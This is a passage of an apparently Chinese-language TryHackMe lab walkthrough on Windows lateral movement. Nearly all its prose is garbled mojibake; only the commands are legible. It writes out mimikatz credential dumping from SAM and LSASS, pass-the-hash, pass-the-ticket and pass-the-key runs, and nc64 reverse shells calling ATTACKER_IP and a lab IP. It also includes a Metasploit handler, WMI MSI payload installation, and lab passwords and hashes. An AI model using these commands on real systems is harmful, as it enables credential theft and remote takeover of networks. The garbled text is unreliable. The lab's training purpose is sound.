æ­¤å®ƒå°†åœ¨æœåŠ¡å™¨ä¸Šçš„ C:\\Windows\\ ä¸­å¯ç”¨ã€‚ æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªå¤„ç†ç¨‹åºæ¥æ¥æ”¶æ¥è‡ª Metasploit çš„åå‘ shellï¼š msf6 exploit(multi/handler) &gt; set LHOST 10.50.46.236 msf6 exploit(multi/handler) &gt; set LPORT 5555 msf6 exploit(multi/handler) &gt; set payload windows/x64/shell_reverse_tcp msf6 exploit(multi/handler) &gt; exploit è®©æˆ‘ä»¬ä» Powershell æ§åˆ¶å°å¯åŠ¨é’ˆå¯¹ THMIIS çš„ WMI ä¼šè¯ï¼š PS C:\\&gt; $username = 't1_corine.waters'; PS C:\\&gt; $password = 'Korine.1994'; PS C:\\&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; PS C:\\&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; PS C:\\&gt; $Opt = New-CimSessionOption -Protocol DCOM PS C:\\&gt; $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop ç„¶åï¼Œæˆ‘ä»¬ä» Win32_Product ç±»è°ƒç”¨ Install æ–¹æ³•æ¥è§¦å‘æœ‰æ•ˆè´Ÿè½½ï¼š PS C:\\&gt; Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = \"C:\\Windows\\bcxinstaller.msi\"; Options = \"\"; AllUsers = $false} å› æ­¤ï¼Œæ‚¨åº”è¯¥åœ¨ AttackBox ä¸­æ”¶åˆ°ä¸€ä¸ªè¿æ¥ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¯¥è¿æ¥è®¿é—® t1_corine.waters æ¡Œé¢ä¸Šçš„æ ‡å¿—ã€‚ 0x05 ä½¿ç”¨æ›¿ä»£è®¤è¯ææ–™ é€šè¿‡æ›¿ä»£èº«ä»½éªŒè¯ææ–™ï¼Œæˆ‘ä»¬æŒ‡çš„æ˜¯å¯ç”¨äºè®¿é—® Windows å¸æˆ·è€Œæ— éœ€å®é™…çŸ¥é“ç”¨æˆ·å¯†ç æœ¬èº«çš„ä»»ä½•æ•°æ®ã€‚è¿™æ˜¯å¯èƒ½çš„ï¼Œå› ä¸º Windows ç½‘ç»œä½¿ç”¨çš„æŸäº›èº«ä»½éªŒè¯åè®®çš„å·¥ä½œæ–¹å¼ã€‚åœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†ç ”ç©¶å½“ç½‘ç»œä¸Šå­˜åœ¨ä»¥ä¸‹ä»»ä¸€èº«ä»½éªŒè¯åè®®æ—¶å¯ä½œä¸ºç”¨æˆ·ç™»å½•çš„å‡ ç§æ›¿ä»£æ–¹æ¡ˆï¼š NTLMè®¤è¯ Kerberos èº«ä»½éªŒè¯ æ³¨æ„ï¼šåœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œå‡å®šæ‚¨ç†Ÿæ‚‰ä»ä¸»æœºæå–å‡­æ®çš„æ–¹æ³•å’Œå·¥å…·ã€‚ Mimikatz å°†è¢«ç”¨ä½œæ•´ä¸ªæˆ¿é—´ä¸­å‡­è¯æå–çš„é¦–é€‰å·¥å…·ã€‚ NTLMè®¤è¯ åœ¨æ·±å…¥ç ”ç©¶å®é™…çš„æ¨ªå‘ç§»åŠ¨æŠ€æœ¯ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ NTLM èº«ä»½éªŒè¯çš„å·¥ä½œåŸç†ï¼š å®¢æˆ·ç«¯å‘ä»–ä»¬æƒ³è¦è®¿é—®çš„æœåŠ¡å™¨å‘é€èº«ä»½éªŒè¯è¯·æ±‚ã€‚ æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªéšæœºæ•°å¹¶å°†å…¶ä½œä¸ºè´¨è¯¢å‘é€ç»™å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯å°†å…¶ NTLM å¯†ç å“ˆå¸Œä¸è´¨è¯¢ï¼ˆä»¥åŠå…¶ä»–å·²çŸ¥æ•°æ®ï¼‰ç»“åˆèµ·æ¥ï¼Œç”Ÿæˆå¯¹è´¨è¯¢çš„å“åº”ï¼Œå¹¶å°†å…¶å‘é€å›æœåŠ¡å™¨è¿›è¡ŒéªŒè¯ã€‚ æœåŠ¡å™¨å°†è´¨è¯¢å’Œå“åº”è½¬å‘ç»™åŸŸæ§åˆ¶å™¨è¿›è¡ŒéªŒè¯ã€‚ åŸŸæ§åˆ¶å™¨ä½¿ç”¨è´¨è¯¢é‡æ–°è®¡ç®—å“åº”å¹¶å°†å…¶ä¸å®¢æˆ·ç«¯å‘é€çš„åˆå§‹å“åº”è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœä¸¤è€…åŒ¹é…ï¼Œåˆ™å®¢æˆ·ç«¯é€šè¿‡èº«ä»½éªŒè¯ï¼›å¦åˆ™ï¼Œè®¿é—®å°†è¢«æ‹’ç»ã€‚è®¤è¯ç»“æœå‘é€å›æœåŠ¡å™¨ã€‚ æœåŠ¡å™¨å°†è®¤è¯ç»“æœè½¬å‘ç»™å®¢æˆ·ç«¯ã€‚ æ³¨æ„ï¼šæ‰€æè¿°çš„è¿‡ç¨‹é€‚ç”¨äºä½¿ç”¨åŸŸå¸æˆ·æ—¶ã€‚å¦‚æœä½¿ç”¨æœ¬åœ°å¸æˆ·ï¼ŒæœåŠ¡å™¨å¯ä»¥éªŒè¯å¯¹è´¨è¯¢æœ¬èº«çš„å“åº”ï¼Œè€Œæ— éœ€ä¸åŸŸæ§åˆ¶å™¨äº¤äº’ï¼Œå› ä¸ºå®ƒçš„ SAM ä¸Šæœ¬åœ°å­˜å‚¨æœ‰å¯†ç å“ˆå¸Œå€¼ã€‚ ä¼ é€’å“ˆå¸Œå€¼ ä»æˆ‘ä»¬è·å¾—ç®¡ç†æƒé™çš„ä¸»æœºä¸­æå–å‡­æ®ï¼ˆé€šè¿‡ä½¿ç”¨ mimikatz æˆ–ç±»ä¼¼å·¥å…·ï¼‰åï¼Œæˆ‘ä»¬å¯èƒ½ä¼šè·å¾—å¯ä»¥è½»æ¾ç ´è§£çš„æ˜æ–‡å¯†ç æˆ–å“ˆå¸Œå€¼ã€‚ç„¶è€Œï¼Œå¦‚æœæˆ‘ä»¬ä¸å¤Ÿå¹¸è¿ï¼Œæˆ‘ä»¬æœ€ç»ˆä¼šå¾—åˆ°æœªç ´è§£çš„ NTLM å¯†ç å“ˆå¸Œå€¼ã€‚ å°½ç®¡æˆ‘ä»¬ä¼¼ä¹æ— æ³•çœŸæ­£ä½¿ç”¨è¿™äº›å“ˆå¸Œå€¼ï¼Œä½†åªéœ€çŸ¥é“å¯†ç å“ˆå¸Œå€¼å³å¯å“åº”èº«ä»½éªŒè¯æœŸé—´å‘é€çš„ NTLM è´¨è¯¢ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨ä¸éœ€è¦çŸ¥é“æ˜æ–‡å¯†ç çš„æƒ…å†µä¸‹è¿›è¡Œèº«ä»½éªŒè¯ã€‚å¦‚æœ Windows åŸŸé…ç½®ä¸ºä½¿ç”¨ NTLM èº«ä»½éªŒè¯ï¼Œåˆ™æ— éœ€ç ´è§£ NTLM å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ é€’å“ˆå¸Œå€¼ (PtH) å¹¶æˆåŠŸè¿›è¡Œèº«ä»½éªŒè¯ã€‚ è¦æå– NTLM å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ mimikatz è¯»å–æœ¬åœ° SAM æˆ–ç›´æ¥ä» LSASS å†…å­˜ä¸­æå–å“ˆå¸Œå€¼ã€‚ ä»æœ¬åœ° SAM ä¸­æå– NTLM å“ˆå¸Œå€¼ æ­¤æ–¹æ³•ä»…å…è®¸æ‚¨ä»è®¡ç®—æœºä¸Šçš„æœ¬åœ°ç”¨æˆ·è·å–å“ˆå¸Œå€¼ã€‚æ²¡æœ‰åŸŸç”¨æˆ·çš„å“ˆå¸Œå€¼å¯ç”¨ã€‚ mimikatz # privilege::debug mimikatz # token::elevate mimikatz # lsadump::sam RID : 000001f4 (500) User : Administrator Hash NTLM: 145e02c50333951f71d13c245d352b50 ä» LSASS å†…å­˜ä¸­æå– NTLM å“ˆå¸Œå€¼ æ­¤æ–¹æ³•å°†å…è®¸æ‚¨æå–æœ¬åœ°ç”¨æˆ·å’Œæœ€è¿‘ç™»å½•åˆ°è®¡ç®—æœºçš„ä»»ä½•åŸŸç”¨æˆ·çš„ä»»ä½• NTLM å“ˆå¸Œå€¼ã€‚ mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::msv Authentication Id : 0 ; 308124 (00000000:0004b39c) Session : RemoteInteractive from 2 User Name : bob.jenkins Domain : ZA Logon Server : THMDC Logon Time : 2022/04/22 09:55:02 SID : S-1-5-21-3330634377-1326264276-632209373-4605 msv : [00000003] Primary * Username : bob.jenkins * Domain : ZA * NTLM : 6b4a57f67805a663c818106dc0648484 ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æå–çš„å“ˆå¸Œå€¼æ¥æ‰§è¡Œ PtH æ”»å‡»ï¼Œæ–¹æ³•æ˜¯ä½¿ç”¨ mimikatz åœ¨åå‘ shellï¼ˆæˆ–æ‚¨å–œæ¬¢çš„ä»»ä½•å…¶ä»–å‘½ä»¤ï¼‰ä¸Šä¸ºå—å®³è€…ç”¨æˆ·æ³¨å…¥è®¿é—®ä»¤ç‰Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š mimikatz # token::revert mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:\"c:\\tools c64.exe -e cmd.exe ATTACKER_IP 5555\" è¯·æ³¨æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨ token::revert æ¥é‡æ–°å»ºç«‹åŸå§‹ä»¤ç‰Œæƒé™ï¼Œå› ä¸ºå°è¯•ä½¿ç”¨æå‡çš„ä»¤ç‰Œä¼ é€’å“ˆå¸Œå°†ä¸èµ·ä½œç”¨ã€‚ è¿™ç›¸å½“äºä½¿ç”¨ runas /netonly ä½†ä½¿ç”¨å“ˆå¸Œè€Œä¸æ˜¯å¯†ç ï¼Œå¹¶å°†ç”Ÿæˆä¸€ä¸ªæ–°çš„åå‘ shellï¼Œæˆ‘ä»¬å¯ä»¥ä»å…¶ä¸­ä»¥å—å®³è€…ç”¨æˆ·èº«ä»½å¯åŠ¨ä»»ä½•å‘½ä»¤ã€‚ è¦æ¥æ”¶åå‘ shellï¼Œæˆ‘ä»¬åº”è¯¥åœ¨ AttackBox ä¸Šè¿è¡Œåå‘ä¾¦å¬å™¨ï¼š nc -lvp 5555 æœ‰è¶£çš„æ˜¯ï¼Œå¦‚æœæ‚¨åœ¨æ­¤ shell ä¸Šè¿è¡Œ whoami å‘½ä»¤ï¼Œå®ƒä»ç„¶ä¼šæ˜¾ç¤ºæ‚¨åœ¨æ‰§è¡Œ PtH ä¹‹å‰ä½¿ç”¨çš„åŸå§‹ç”¨æˆ·ï¼Œä½†ä»è¿™é‡Œè¿è¡Œçš„ä»»ä½•å‘½ä»¤å®é™…ä¸Šéƒ½ä¼šä½¿ç”¨æˆ‘ä»¬ä½¿ç”¨ PtH æ³¨å…¥çš„å‡­æ®ã€‚ ä½¿ç”¨ Linux ä¼ é€’å“ˆå¸Œ å¦‚æœæ‚¨å¯ä»¥è®¿é—® Linux ç›’å­ï¼ˆå¦‚ AttackBoxï¼‰ï¼Œæœ‰å‡ ä¸ªå·¥å…·å…·æœ‰å†…ç½®æ”¯æŒï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„åè®®æ‰§è¡Œ PtHã€‚æ ¹æ®æ‚¨å¯ä»¥ä½¿ç”¨çš„æœåŠ¡ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š ä½¿ç”¨ PtH è¿æ¥åˆ° RDPï¼š xfreerdp /v:VICTIM_IP /u:DOMAIN\\\\MyUser /pth:NTLM_HASH ä½¿ç”¨ PtH é€šè¿‡ psexec è¿æ¥ï¼š psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP æ³¨æ„ï¼šä»… Linux ç‰ˆæœ¬çš„ psexec æ”¯æŒ PtHã€‚ ä½¿ç”¨ PtH è¿æ¥åˆ° WinRMï¼š evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH Kerberos èº«ä»½éªŒè¯ è®©æˆ‘ä»¬å¿«é€Ÿäº†è§£ä¸€ä¸‹ Kerberos èº«ä»½éªŒè¯åœ¨ Windows ç½‘ç»œä¸Šçš„å·¥ä½œåŸç†ï¼š ç”¨æˆ·å°†å…¶ç”¨æˆ·åå’Œä½¿ç”¨ä»å…¶å¯†ç æ´¾ç”Ÿçš„å¯†é’¥åŠ å¯†çš„æ—¶é—´æˆ³å‘é€åˆ°å¯†é’¥åˆ†å‘ä¸­å¿ƒ (KDC)ï¼Œè¯¥æœåŠ¡é€šå¸¸å®‰è£…åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼Œè´Ÿè´£åœ¨ç½‘ç»œä¸Šåˆ›å»º Kerberos ç¥¨è¯ã€‚ KDC å°†åˆ›å»ºå¹¶å‘å›ç¥¨è¯æˆäºˆç¥¨è¯ (TGT)ï¼Œå…è®¸ç”¨æˆ·è¯·æ±‚ç¥¨è¯æ¥è®¿é—®ç‰¹å®šæœåŠ¡ï¼Œè€Œæ— éœ€å°†å…¶å‡­æ®ä¼ é€’ç»™æœåŠ¡æœ¬èº«ã€‚ä¸ TGT ä¸€èµ·ï¼Œè¿˜å°†å‘ç”¨æˆ·æä¾›ä¼šè¯å¯†é’¥ï¼Œç”¨æˆ·å°†éœ€è¦è¯¥ä¼šè¯å¯†é’¥æ¥ç”Ÿæˆåç»­è¯·æ±‚ã€‚ è¯·æ³¨æ„ï¼ŒTGT ä½¿ç”¨ krbtgt å¸æˆ·çš„å¯†ç å“ˆå¸Œè¿›è¡ŒåŠ å¯†ï¼Œå› æ­¤ç”¨æˆ·æ— æ³•è®¿é—®å…¶å†…å®¹ã€‚é‡è¦çš„æ˜¯è¦çŸ¥é“åŠ å¯†çš„ TGT åŒ…æ‹¬ä¼šè¯å¯†é’¥çš„å‰¯æœ¬ä½œä¸ºå…¶å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸” KDC ä¸éœ€è¦å­˜å‚¨ä¼šè¯å¯†é’¥ï¼Œå› ä¸ºå®ƒå¯ä»¥åœ¨éœ€è¦æ—¶é€šè¿‡è§£å¯† TGT æ¥æ¢å¤å‰¯æœ¬ã€‚ å½“ç”¨æˆ·æƒ³è¦è¿æ¥åˆ°ç½‘ç»œä¸Šçš„æœåŠ¡ï¼ˆä¾‹å¦‚å…±äº«ã€ç½‘ç«™æˆ–æ•°æ®åº“ï¼‰æ—¶ï¼Œä»–ä»¬å°†ä½¿ç”¨ TGT å‘ KDC è¯·æ±‚ç¥¨è¯æˆäºˆæœåŠ¡ (TGS)ã€‚ TGS æ˜¯åªå…è®¸è¿æ¥åˆ°ä¸ºå…¶åˆ›å»ºçš„ç‰¹å®šæœåŠ¡çš„ç¥¨è¯ã€‚è¦è¯·æ±‚ TGSï¼Œç”¨æˆ·å°†å‘é€ä»–çš„ç”¨æˆ·åå’Œä½¿ç”¨ä¼šè¯å¯†é’¥åŠ å¯†çš„æ—¶é—´æˆ³ï¼Œä»¥åŠ TGT å’ŒæœåŠ¡ä¸»ä½“åç§° (SPN)ï¼Œè¯¥åç§°æŒ‡ç¤ºæˆ‘ä»¬æ‰“ç®—è®¿é—®çš„æœåŠ¡å’ŒæœåŠ¡å™¨åç§°ã€‚ å› æ­¤ï¼ŒKDC å°†å‘æˆ‘ä»¬å‘é€ TGS å’ŒæœåŠ¡ä¼šè¯å¯†é’¥ï¼Œæˆ‘ä»¬éœ€è¦å¯¹æˆ‘ä»¬æƒ³è¦è®¿é—®çš„æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯ã€‚ TGS ä½¿ç”¨æœåŠ¡æ‰€æœ‰è€…å“ˆå¸Œè¿›è¡ŒåŠ å¯†ã€‚æœåŠ¡æ‰€æœ‰è€…æ˜¯è¿è¡ŒæœåŠ¡çš„ç”¨æˆ·æˆ–è®¡ç®—æœºå¸æˆ·ã€‚ TGS åœ¨å…¶åŠ å¯†å†…å®¹ä¸ŠåŒ…å«æœåŠ¡ä¼šè¯å¯†é’¥çš„å‰¯æœ¬ï¼Œä»¥ä¾¿æœåŠ¡æ‰€æœ‰è€…å¯ä»¥é€šè¿‡è§£å¯† TGS æ¥è®¿é—®å®ƒã€‚ ç„¶åå¯ä»¥å°† TGS å‘é€åˆ°æ‰€éœ€çš„æœåŠ¡ä»¥è¿›è¡Œèº«ä»½éªŒè¯å¹¶å»ºç«‹è¿æ¥ã€‚è¯¥æœåŠ¡å°†ä½¿ç”¨å…¶é…ç½®çš„å¸æˆ·çš„å¯†ç å“ˆå¸Œæ¥è§£å¯† TGS å¹¶éªŒè¯æœåŠ¡ä¼šè¯å¯†é’¥ã€‚ ä¼ ç¥¨ æœ‰æ—¶å¯ä»¥ä½¿ç”¨ mimikatz ä» LSASS å†…å­˜ä¸­æå– Kerberos ç¥¨è¯å’Œä¼šè¯å¯†é’¥ã€‚è¯¥è¿‡ç¨‹é€šå¸¸éœ€è¦æˆ‘ä»¬åœ¨è¢«æ”»å‡»çš„æœºå™¨ä¸Šæ‹¥æœ‰ SYSTEM æƒé™ï¼Œå¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼å®Œæˆï¼š mimikatz # privilege::debug mimikatz # sekurlsa::tickets /export è¯·æ³¨æ„ï¼Œå¦‚æœæˆ‘ä»¬åªèƒ½è®¿é—®ç¥¨è¯è€Œä¸èƒ½è®¿é—®å…¶ç›¸åº”çš„ä¼šè¯å¯†é’¥ï¼Œåˆ™æˆ‘ä»¬å°†æ— æ³•ä½¿ç”¨è¯¥ç¥¨è¯ï¼›å› æ­¤ï¼Œä¸¤è€…éƒ½æ˜¯å¿…è¦çš„ã€‚ è™½ç„¶ mimikatz å¯ä»¥ä» LSASS è¿›ç¨‹çš„å†…å­˜ä¸­æå–ä»»ä½•å¯ç”¨çš„ TGT æˆ– TGSï¼Œä½†å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå¯¹ TGT æ„Ÿå…´è¶£ï¼Œå› ä¸ºå®ƒä»¬å¯ç”¨äºè¯·æ±‚è®¿é—®å…è®¸ç”¨æˆ·è®¿é—®çš„ä»»ä½•æœåŠ¡ã€‚åŒæ—¶ï¼ŒTGS ä»…é€‚ç”¨äºç‰¹å®šæœåŠ¡ã€‚æå– TGT éœ€è¦æˆ‘ä»¬æ‹¥æœ‰ç®¡ç†å‘˜å‡­æ®ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ä½æƒé™å¸æˆ·ï¼ˆä»…åˆ†é…ç»™è¯¥å¸æˆ·çš„å¸æˆ·ï¼‰æ¥æå– TGSã€‚ ä¸€æ—¦æˆ‘ä»¬æå–äº†æ‰€éœ€çš„ç¥¨è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†ç¥¨è¯æ³¨å…¥å½“å‰ä¼šè¯ï¼š mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi åœ¨æˆ‘ä»¬è‡ªå·±çš„ä¼šè¯ä¸­æ³¨å…¥ç¥¨è¯ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚æ­¤åï¼Œæˆ‘ä»¬ç”¨äºæ¨ªå‘ç§»åŠ¨çš„ä»»ä½•å·¥å…·éƒ½å¯ä»¥ä½¿ç”¨é—¨ç¥¨ã€‚è¦æ£€æŸ¥ç¥¨è¯æ˜¯å¦å·²æ­£ç¡®æ³¨å…¥ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ klist å‘½ä»¤ï¼š za\\bob.jenkins@THMJMP2 C:\\&gt; klist Current LogonId is 0:0x1e43562 Cached Tickets: (1) #0&gt; Client: Administrator @ ZA.TRYHACKME.COM Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize Start Time: 4/12/2022 0:28:35 (local) End Time: 4/12/2022 10:28:35 (local) Renew Time: 4/23/2022 0:28:35 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0x1 -&gt; PRIMARY Kdc Called: THMDC.za.tryhackme.com è·¨è¶Šå“ˆå¸Œ/ä¼ é€’å¯†é’¥ è¿™ç§æ”»å‡»ä¸ PtH ç±»ä¼¼ï¼Œä½†é€‚ç”¨äº Kerberos ç½‘ç»œã€‚ å½“ç”¨æˆ·è¯·æ±‚ TGT æ—¶ï¼Œä»–ä»¬ä¼šå‘é€ä½¿ç”¨ä»å…¶å¯†ç æ´¾ç”Ÿçš„åŠ å¯†å¯†é’¥åŠ å¯†çš„æ—¶é—´æˆ³ã€‚ç”¨äºæ´¾ç”Ÿæ­¤å¯†é’¥çš„ç®—æ³•å¯ä»¥æ˜¯ DESï¼ˆåœ¨å½“å‰ Windows ç‰ˆæœ¬ä¸Šé»˜è®¤ç¦ç”¨ï¼‰ã€RC4ã€AES128 æˆ– AES256ï¼Œå…·ä½“å–å†³äºå®‰è£…çš„ Windows ç‰ˆæœ¬å’Œ Kerberos é…ç½®ã€‚å¦‚æœæˆ‘ä»¬æ‹¥æœ‰è¿™äº›å¯†é’¥ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ KDC è¯·æ±‚ TGTï¼Œè€Œæ— éœ€å®é™…å¯†ç ï¼Œå› æ­¤å¾—åâ€œä¼ é€’å¯†é’¥â€(PtK)ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ mimikatz å’Œä»¥ä¸‹å‘½ä»¤ä»å†…å­˜ä¸­è·å– Kerberos åŠ å¯†å¯†é’¥ï¼š mimikatz # privilege::debug mimikatz # sekurlsa::ekeys æ ¹æ®å¯ç”¨çš„å¯†é’¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ mimikatz ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œä»¥é€šè¿‡å¯†é’¥ä¼ é€’æ¥è·å–åå‘ shellï¼ˆä¸ºæ–¹ä¾¿èµ·è§ï¼ŒTHMJMP2 ä¸­å·²æä¾› nc64 ï¼‰ï¼š å¦‚æœæˆ‘ä»¬æœ‰ RC4 å“ˆå¸Œï¼š mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:\"c:\\tools c64.exe -e cmd.exe ATTACKER_IP 5556\" å¦‚æœæˆ‘ä»¬æœ‰ AES128 å“ˆå¸Œï¼š mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:\"c:\\tools c64.exe -e cmd.exe ATTACKER_IP 5556\" å¦‚æœæˆ‘ä»¬æœ‰ AES256 å“ˆå¸Œï¼š mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:\"c:\\tools c64.exe -e cmd.exe ATTACKER_IP 5556\" è¯·æ³¨æ„ï¼Œä½¿ç”¨ RC4 æ—¶ï¼Œå¯†é’¥å°†ç­‰äºç”¨æˆ·çš„ NTLM å“ˆå¸Œå€¼ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æå– NTLM å“ˆå¸Œï¼Œåªè¦ RC4 æ˜¯å¯ç”¨çš„åè®®ä¹‹ä¸€ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å®ƒæ¥è¯·æ±‚ TGTã€‚è¿™ç§ç‰¹æ®Šçš„å˜ä½“é€šå¸¸è¢«ç§°ä¸º Overpass-the-Hash (OPtH)ã€‚ è¦æ¥æ”¶åå‘ shellï¼Œæˆ‘ä»¬åº”è¯¥åœ¨ AttackBox ä¸Šè¿è¡Œåå‘ä¾¦å¬å™¨ï¼š user@AttackBox$ nc -lvp 5556 å°±åƒ PtH ä¸€æ ·ï¼Œä»æ­¤ shell è¿è¡Œçš„ä»»ä½•å‘½ä»¤éƒ½å°†ä½¿ç”¨é€šè¿‡ mimikatz æ³¨å…¥çš„å‡­æ®ã€‚ å®è·µç»ƒä¹  è¦å¼€å§‹æœ¬ç»ƒä¹ ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‡­æ®é€šè¿‡ SSH è¿æ¥åˆ° THMJMP2ï¼š ç”¨æˆ·ï¼šZA.TRYHACKME.COM\\t2_felicia.dean Passwordï¼šiLov3THM! ssh za\\\\t2_felicia.dean@thmjmp2.za.tryhackme.com è¿™äº›å‡­æ®å°†æˆäºˆæ‚¨å¯¹ THMJMP2 çš„ç®¡ç†è®¿é—®æƒé™ï¼Œå…è®¸æ‚¨ä½¿ç”¨ mimikatz è½¬å‚¨æ‰§è¡Œæ­¤ä»»åŠ¡æœŸé—´æä¾›çš„ä»»ä½•æŠ€æœ¯æ‰€éœ€çš„èº«ä»½éªŒè¯ææ–™ã€‚ ä½¿ç”¨ SSH ä¼šè¯ï¼Œä½¿ç”¨ mimikatz æå–èº«ä»½éªŒè¯ææ–™å¹¶é’ˆå¯¹åŸŸç”¨æˆ· t1_toby.beck æ‰§è¡Œ Pass-the-Hashã€Pass-the-Ticket æˆ– Pass-the-Keyã€‚ ä¸€æ—¦æ‚¨çš„å‘½ä»¤æç¤ºç¬¦å·²åŠ è½½å…¶å‡­æ®ï¼Œè¯·ä½¿ç”¨ winrs è¿æ¥åˆ° THMIIS ä¸Šçš„å‘½ä»¤æç¤ºç¬¦ã€‚ç”±äºä»»ä½•æ”»å‡»éƒ½å·²å°† t1_toby.beck çš„å‡­æ®æ³¨å…¥åˆ°æ‚¨çš„ä¼šè¯ä¸­ï¼Œå› æ­¤æ‚¨å¯ä»¥ä½¿ç”¨ winrs è€Œä¸æŒ‡å®šä»»ä½•å‡­æ®ï¼Œå¹¶ä¸”å®ƒå°†ä½¿ç”¨å½“å‰ä¼šè¯å¯ç”¨çš„å‡­æ®ï¼š winrs.exe -r:THMIIS.za.tryhackme.com cmd æ‚¨ä¼šåœ¨ THMIIS ä¸Š t1_toby.beck çš„æ¡Œé¢ä¸Šæ‰¾åˆ°ä¸€ä¸ªæ ‡å¿—ã€‚ mimikatz å’Œ psexec64 å‡å¯åœ¨ THMJMP2 ä¸Šçš„ C:\\tools å¤„è·å–ã€‚ Pass-the-Hash é¦–å…ˆå°±æ˜¯è·å–è®¡ç®—æœºä¸Šç”¨æˆ·çš„å“ˆå¸Œå€¼ï¼š privilege::debug token::elevate lsadump::samæˆ–è€…sekurlsa::msv //æˆ‘ä½¿ç”¨çš„åè€… æ¥ç€æ‰¾åˆ°ç›®æ ‡ç”¨æˆ·t1_toby.beckå¯¹åº”çš„hashå€¼ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æå–çš„å“ˆå¸Œå€¼æ¥æ‰§è¡Œ PtH æ”»å‡»ï¼Œæ–¹æ³•æ˜¯ä½¿ç”¨ mimikatz åœ¨åå‘ shellï¼ˆæˆ–æ‚¨å–œæ¬¢çš„ä»»ä½•å…¶ä»–å‘½ä»¤ï¼‰ä¸Šä¸ºå—å®³è€…ç”¨æˆ·æ³¨å…¥è®¿é—®ä»¤ç‰Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š mimikatz # token::revert mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:\"c:\\tools c64.exe -e cmd.exe 10.50.46.236 5555\" è¯·æ³¨æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨ token::revert æ¥é‡æ–°å»ºç«‹åŸå§‹ä»¤ç‰Œæƒé™ï¼Œå› ä¸ºå°è¯•ä½¿ç”¨æå‡çš„ä»¤ç‰Œä¼ é€’å“ˆå¸Œå°†ä¸èµ·ä½œç”¨ã€‚ æˆåŠŸæ‹¿åˆ°shellï¼Œæ¥ç€æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š ä¸€æ—¦æ‚¨çš„å‘½ä»¤æç¤ºç¬¦å·²åŠ è½½å…¶å‡­æ®ï¼Œè¯·ä½¿ç”¨ winrs è¿æ¥åˆ° THMIIS ä¸Šçš„å‘½ä»¤æç¤ºç¬¦ã€‚ç”±äºä»»ä½•æ”»å‡»éƒ½å·²å°† t1_toby.beck çš„å‡­æ®æ³¨å…¥åˆ°æ‚¨çš„ä¼šè¯ä¸­ï¼Œå› æ­¤æ‚¨å¯ä»¥ä½¿ç”¨ winrs è€Œä¸æŒ‡å®šä»»ä½•å‡­æ®ï¼Œå¹¶ä¸”å®ƒå°†ä½¿ç”¨å½“å‰ä¼šè¯å¯ç”¨çš„å‡­æ®ï¼š winrs.exe -r:THMIIS.za.tryhackme.com cmd æ‚¨ä¼šåœ¨ THMIIS 